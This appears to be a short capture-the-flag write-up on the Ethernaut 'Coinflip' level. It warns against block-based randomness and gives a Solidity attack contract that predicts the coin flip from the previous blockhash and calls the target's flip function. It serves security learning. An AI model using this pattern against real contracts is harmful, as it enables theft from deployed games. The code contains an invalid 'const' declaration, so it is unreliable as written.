# Day 3 - Coinflip

Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.

```js
pragma solidity ^0.6.0;
import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract AttackCoinFlip {
  using SafeMath for uint256;
  address public targetContract;
  uint256 const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _targetContract) public {
    targetContract = _targetContract;
  }

  function attackFlipWithContract() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(targetContract).flip(side);
  }

  function attackFlipWithoutContract() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    // low level call example: https://solidity-by-example.org/0.6/call/
    bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
    (bool success, ) = targetContract.call(payload);
    require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```
